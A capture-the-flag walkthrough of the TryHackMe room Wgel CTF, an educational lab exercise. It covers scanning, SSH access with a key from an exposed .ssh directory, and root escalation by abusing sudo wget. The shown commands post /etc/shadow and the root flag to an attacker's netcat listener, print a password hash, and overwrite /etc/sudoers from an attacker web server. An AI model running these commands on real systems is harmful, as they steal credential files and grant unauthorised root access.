# Wgel CTF

|Room|   [Wgel CTF](https://tryhackme.com/room/wgelctf)|  
|---|---|
|Difficulty|easy| 
|Type|pwn|
|Author|[MrSeth6797](https://tryhackme.com/p/MrSeth6797)|

This room is pretty neat. The initial part got me looking for exploits that did not exist, and getting to the last flag was fun. I liked how a misconfiguration allows getting the root flag in multiple ways. One without even requiring a root shell.

## Nmap
```shell
sudo nmap -sS -sV -sC -p- -vv -oA scan 10.10.77.137
```
Output
```shell
# Nmap 7.91 scan initiated Mon Jul 26 23:28:56 2021 as: nmap -sS -sV -sC -p- -vv -oA scan 10.10.77.137
Nmap scan report for 10.10.77.137
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2021-07-26 23:28:56 EDT for 468s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 26 23:36:44 2021 -- 1 IP address (1 host up) scanned in 468.71 seconds
```

## Gobuster
>Note: You should use /dirb/common.txt wordlist for your second scan

1)
```shell
sudo gobuster dir -u http://10.10.77.137/ -w /usr/share/wordlists/dirb/common.txt -o diretorios.txt -k
```
Output
```shell
/sitemap (Status: 301) [Size: 314] [--> http://10.10.77.137/sitemap/]
```
2)
```shell
sudo gobuster dir -u http://10.10.77.137/sitemap/ -w /usr/share/wordlists/dirb/common.txt -o diretorios2.txt -k
```
Output
```shell
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.77.137/sitemap/.ssh/]
/css                  (Status: 301) [Size: 318] [--> http://10.10.77.137/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.77.137/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.77.137/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 317] [--> http://10.10.77.137/sitemap/js/]
```                            


## Initial Access
As I waited for gobuster's second scan to finish, I explored the site in sitemap and did a quick search from which I found Unapp is a theme from colorlib. From this finding, I began looking for exploits and CVEs, but sadly found nothing useful. After trying the contact us button hoping to find a username but ended up with nothing, I decided to analyze the source code. I ended up giving fast on this since the code looked fresh out of the box from the template. At this point, I decided to go back and check the default Apache site, and that's when I found the following.

 <!-- Jessie don't forget to udate the webiste --> (Photo here)

Ha! So we now have our user. 

Gobuster ended up finding an interesting directory called .ssh, so yeah...you can guess what is in that directory. 
(Picture)

So now we should use this key to connect. 
>If you get an error when sshing, run this command to change the file permissions
>``` shell
sudo chmod 400 id_rsa 
 
 >**User flag**
 >location: /home/jessie/Documents
 
## privesc
If we go and see what can we run as root

```shell
sudo -l
```
we see the following
```shell
(root) NOPASSWD: /usr/bin/wget
``` 
being able to run wget as sudo opens up some pretty interesting options since we can send files from this machine to ours or upload files to the machine which will keep the permissions. 

To test this I decided to download the /etc/shadow file. Even though we don't have access to the file, we can exploit the sudo capabilities to achieve it. 

Attacker
```shell
sudo nc -lnvp 1234  
``` 
Target
```shell
sudo wget --post-file=/etc/shadow 10.9.148.82:1234
``` 
and *Voilà*
```shell
root:!:18195:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:17954:0:99999:7:::
uuidd:*:17954:0:99999:7:::
lightdm:*:17954:0:99999:7:::
whoopsie:*:17954:0:99999:7:::
avahi-autoipd:*:17954:0:99999:7:::
avahi:*:17954:0:99999:7:::
dnsmasq:*:17954:0:99999:7:::
colord:*:17954:0:99999:7:::
speech-dispatcher:!:17954:0:99999:7:::
hplip:*:17954:0:99999:7:::
kernoops:*:17954:0:99999:7:::
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
jessie:$6$0wv9XLy.$HxqSdXgk7JJ6n9oZ9Z52qxuGCdFqp0qI/9X.a4VRJt860njSusSuQ663bXfIV7y.ywZxeOinj4Mckj8/uvA7U.:18195:0:99999:7:::
sshd:*:18195:0:99999:7:::
``` 

This is where things get funny. Just as we downloaded this file, we can just download the root flag! We just need to use the same syntax that the user flag file had, and we end up with the following command

```shell
sudo wget --post-file=/root/root_flag.txt 10.9.148.82:1234
```

## Root shell
Even though we already have the flag, we clearly haven't pwned the system, so let's do it. For achieving this, we'll do things the other way now, we will upload a file. 

In the /etc folder, there is a file called sudoers. This file specifies which users have sudo access. What if we create our own, and upload it with the wget permissions? 

We can just create a file called sudoers with the next content
```shell
jessie  ALL=(ALL) NOPASSWD: ALL
```
then, let's start an HTTP server on our machine.
```shell
sudo python3 -m http.server 81 
```
following this, we should upload it to the target's etc directory. Since there is already a file called like this, it's important to use the output parameter, so the content is written to the original file.
```shell
sudo wget http://10.9.148.82:81/sudoers --output-document=sudoers
```
Then just run a 
```shell
sudo su
```

And our job here is done. 

>**Root flag**
>location: /root
